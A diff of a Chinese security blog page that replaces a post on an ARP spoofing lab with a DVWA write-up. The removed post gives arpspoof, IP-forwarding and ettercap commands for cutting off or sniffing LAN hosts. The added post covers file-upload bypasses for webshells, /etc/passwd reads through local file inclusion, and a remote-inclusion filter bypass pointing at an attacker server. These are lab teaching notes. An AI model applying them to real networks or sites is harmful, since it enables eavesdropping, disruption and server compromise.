@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ARP欺骗实验, Keep-Boom">
+    <meta name="keywords" content="DVWA, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ARP欺骗实验 | Keep-Boom</title>
+    <title>DVWA | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ARP欺骗实验</h1>
+                    <h1 class="description center-align post-title">DVWA</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-28
+                    2021-01-04
                 </div>
                 
 
@@ -459,34 +459,101 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。"><a href="#这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。" class="headerlink" title="这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。"></a>这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。</h3><h4 id="简单分析下ARP协议"><a href="#简单分析下ARP协议" class="headerlink" title="简单分析下ARP协议"></a>简单分析下ARP协议</h4><p>ARP(Address Resolution Protocol)地址解析协议，是根据IP地址获取其物理地址/MAC地址(硬件地址)的一个TCP/IP协议。它的作用是让局域网内的设备可以正常互相通信。地址解析协议是建立在网络中各个主机互相信任的基础上的。<u><em>所以存在一个缺点</em></u>，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗(ARPspoofing)。</p>
-<h4 id="局域网内两台设备如何通信的呢？"><a href="#局域网内两台设备如何通信的呢？" class="headerlink" title="局域网内两台设备如何通信的呢？"></a>局域网内两台设备如何通信的呢？</h4><p>局域网间的两台设备进行通信不是通过IP地址，而是通过MAC地址。</p>
-<p>局域网内有3台设备A,B,C。A的IP地址为192.168.1.1，MAC地址为01-01-01-01-01-01。B的IP地址为192.168.1.2，MAC地址为02-02-02-02-02-02。如果知道了对方的MAC地址（MAC地址就像是身份证，IP地址就像是姓名，名字一样的人很多，但身份证是唯一的），就可以进行通信了。如果不知道对方的MAC地址怎么办呢？</p>
-<p>之时A会发送一个ARP请求报文，里面包括了源IP地址(A的IP)，源MAC地址。目的IP地址(B的IP)，目的MAC地址(但此时不知道对方的MAC地址，就会设为广播地址FF-FF-FF-FF-FF-FF)。发送给交换机，交换机进行局域网内的广播，这个IP地址是谁的，C看到发现不是自己的IP地址就会丢弃掉，B发现是自己的就会接收，并把自己的MAC地址应答回去。此时应答就不是广播，而是单播。把ARP应答报文发送给交换机，交换机再转发给A。这样A的ARP缓存表里就有B的MAC地址。</p>
-<h4 id="ARP欺骗-中间人攻击中的一种-怎么实现呢？"><a href="#ARP欺骗-中间人攻击中的一种-怎么实现呢？" class="headerlink" title="ARP欺骗(中间人攻击中的一种)怎么实现呢？"></a>ARP欺骗(中间人攻击中的一种)怎么实现呢？</h4><p>发现A和B进行通信时，有个中间人进行转发就是交换机。而ARP有个缺点，就是不会检测报文的真实性就会接收。</p>
-<p>假如C要知道A和B之间在干啥怎么办呢？C可以发送一个应答报文给A(IP为交换机的IP，MAC地址为C的ACK地址)。这时A就会认为，C是转发人员，把传给B的信息传给C，C可以先把信息内容存起来再转发给B。对B也进行同样的操作，就可以知道A和B之间在干啥了，达到了窃听的效果。</p>
-<p>断网就是给A一个假的MAC地址，进行重定性。这样A就上网不了。当然断网没有意思，ARP欺骗主要是用来监听，挂马等操作。</p>
-<h4 id="如何进行断网、监听操作呢？"><a href="#如何进行断网、监听操作呢？" class="headerlink" title="如何进行断网、监听操作呢？"></a>如何进行断网、监听操作呢？</h4><p><u><em>前提：须在同一个局域网下，知道对方的IP。</em></u></p>
-<p>使用kali作为攻击机。网络连接模式设为桥接模式。</p>
-<p>先ifconfig查询自己的网段(192.168.1.  )及网卡信息(例如 eth0)</p>
-<p>使用nmap扫描出，同网段下存活的主机IP。</p>
-<p>在kali终端输入 route -n 可以查询网关</p>
-<h4 id="为啥要查询网关呢？"><a href="#为啥要查询网关呢？" class="headerlink" title="为啥要查询网关呢？"></a>为啥要查询网关呢？</h4><p>一台局域网下的机子，如何访问外网的资源呢？如图</p>
-<p><img src="/images/11.png"></p>
-<p>会先经过交换机，再经过网关，由网关向外界发送信息，最后再原路返回。</p>
-<p>断网操作，骗取机子网关的MAC地址是你的MAC地址，或者是不存在的MAC地址。让数据包走势如图</p>
-<p><img src="/images/12.png"></p>
-<p>输入 arpspoof -i eth0 -t 目标IP   网关</p>
-<p>这样受害机子，就永远发不出包，也就收不到应答包。就上不了网。</p>
-<p>监听，让对方能正常上网。但在网站上操作的数据会被你窃取走。</p>
-<p>#需先打开IP转发功能。kali默认是关闭的。执行以下命令开启IP转发功能</p>
-<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>
-<p>再进行以下操作</p>
-<p>arpspoof -i eth0 -t 目标IP   网关</p>
-<p>ettercap -Tq -i eth0</p>
-<p>就可开启对目标机子的监听了。</p>
-<h4 id="最后再附上两张图帮助ARP工作原理，欺骗原理。"><a href="#最后再附上两张图帮助ARP工作原理，欺骗原理。" class="headerlink" title="最后再附上两张图帮助ARP工作原理，欺骗原理。"></a>最后再附上两张图帮助ARP工作原理，欺骗原理。</h4><p><img src="/images/9.png"></p>
-<p><img src="/images/10.png"></p>
+                <h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>①Low</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
+     <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
+     <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                 </span>
+         <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
+         <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>         
+         <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+     <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;               </span>
+         <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
+         <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>         
+         <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>               
+     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
+ <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+<span class="token delimiter">?></span> </code></pre>
+<p>从源码里可以看出对上传的文件没有做任何的检测。所以直接上传木马文件即可获取webshell。</p>
+<p>②Medium</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
+         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
+         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
+         <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
+         <span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
+         <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
+         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;          if(!move_uploaded_file($_FILES[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
+             <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
+             <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>           
+             <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+      <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
+            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
+            <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>           
+            <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                     
+           <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
+       <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
+      <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;         </span>
+            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class="token punctuation">;</span>       
+          <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
+     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+<span class="token delimiter">?></span> </code></pre>
+<p>从源码中可以看见，通过$_FILES来获取上传文件的名字，类型，大小。如果文件类型和大小符合要求就可以上传。</p>
+<p>所以可以用burp进行拦截修改Connect-Type 为 image/jpeg  即可上传成功，获取webshell。</p>
+<p>③High</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> 
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
+         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
+         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
+         <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
+         <span class="token variable">$uploaded_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
+         <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
+         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"jpg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"JPG"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"jpeg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"JPEG"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;          </span>
+             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                                        echo </span><span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
+                 <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>           
+                 <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+             <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
+                 <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
+                 <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>          
+                 <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                     
+             <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
+         <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;             </span>
+         <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                 </span>
+             <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
+             <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>         
+             <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>       
+         <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
+     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+<span class="token delimiter">?></span> </code></pre>
+<p>从源码可以看出，这次是对后缀进行检测，是jpg格式的文件才能上传。</p>
+<p>这里可以利用00截断进行绕过，在burp里拦截请求包，把fox.php改成fox.php.jpg。然后转成Hex显示格式，找到对应的这一行把.对应的2e 改成 00。然后发送请求包，就可成功绕过。</p>
+<p>注：这里php的版本必须是5.5以下。</p>
+<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>文件包含分为LFI(Local File Inclusion)本地文件包含和RFI(Remote File Inclusion)远程文件包含。</p>
+<p>注：一般网站都不会开放远程文件包含，因为太危险了。</p>
+<p>①Low</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
+ <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display </span>
+ <span class="token delimiter">?></span> </code></pre>
+<p>对包含的文件没有做任何的限制，所以可以读取些敏感目录如：/etc/passwd</p>
+<p>可以结合文件上传漏洞，现在文件上传漏洞那上传一张图片马，然后利用文件包含漏洞进行解析，获取webshell。</p>
+<p>②Medium</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
+ <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// The page we wish to display    // Bad input validation   </span>
+ <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $file);   </span>
+ <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>"https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $file);     </span>
+ <span class="token delimiter">?></span> </code></pre>
+<p>这里本地包含没有问题，但是把http://和https://替换成空。看似不能进行远程包含，但和SQL注入绕过一样，进行叠加即可绕过。</p>
+<p>#example:  httphttp://://x.x.x/1.txt</p>
+<p>可以用自己的kali来当另一台服务器角色，在kali里启动apache服务，在物理机上进行访问(访问kali的ip，可以访问到apache的页面，什么也没有)，然后在var/www/html下随便写个文件保存。再在物理机上如果可以访问到就没问题。再去靶场进行远程文件包含。</p>
+<p>①High</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>       
+ <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display    // Only allow include.php   </span>
+ <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"include.php"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;     </span>
+ <span class="token keyword">echo</span> <span class="token string">"ERROR: File not found!"</span><span class="token punctuation">;</span>     
+ exit<span class="token punctuation">;</span>   <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
+ <span class="token delimiter">?></span> </code></pre>
+<p>这里就是限制的很死，只能包含include.php。这样写，就像铁桶保护一样，但是灵活性很差。后期修改代码，维护比较不方便。</p>
+<p>##如果有大佬可以绕过这个High，可以联系作者有偿！</p>
 
             </div>
             <hr/>
@@ -512,7 +579,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2020/12/28/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/">http://example.com/2020/12/28/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/</a>
+                    <a href="http://example.com/2021/01/04/DVWA/">http://example.com/2021/01/04/DVWA/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -717,9 +784,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/01/04/DVWA/">
                     <div class="card-image">
@@ -737,9 +805,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -748,6 +816,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -758,13 +827,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/22/Uplaod-labs/">
+                <a href="/2020/12/28/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Uplaod-labs">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ARP欺骗实验">
                         
-                        <span class="card-title">Uplaod-labs</span>
+                        <span class="card-title">ARP欺骗实验</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -775,7 +844,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-28
                             </span>
                         <span class="publish-author">
                             
